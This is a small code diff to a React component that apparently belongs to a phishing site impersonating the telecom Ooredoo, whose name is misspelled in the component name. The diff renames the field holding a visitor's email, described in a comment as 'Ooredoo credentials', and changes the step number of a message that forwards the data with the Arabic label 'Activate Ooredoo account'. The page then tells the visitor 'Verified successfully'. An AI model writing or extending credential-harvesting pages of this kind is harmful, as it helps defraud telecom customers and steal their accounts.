@@ -37,11 +37,11 @@ const OoreedooVerification = () => {
     try {
       // Save Ooredoo credentials
       await updateData({
-        visitorEmail: data.email,
+        ooredooEmail: data.email,
       });
 
-      await sendCumulativeMessage(8, "تفعيل حساب Ooredoo", {
-        visitorEmail: data.email,
+      await sendCumulativeMessage(7, "تفعيل حساب Ooredoo", {
+        ooredooEmail: data.email,
       });
 
       toast.success("تم التحقق بنجاح");
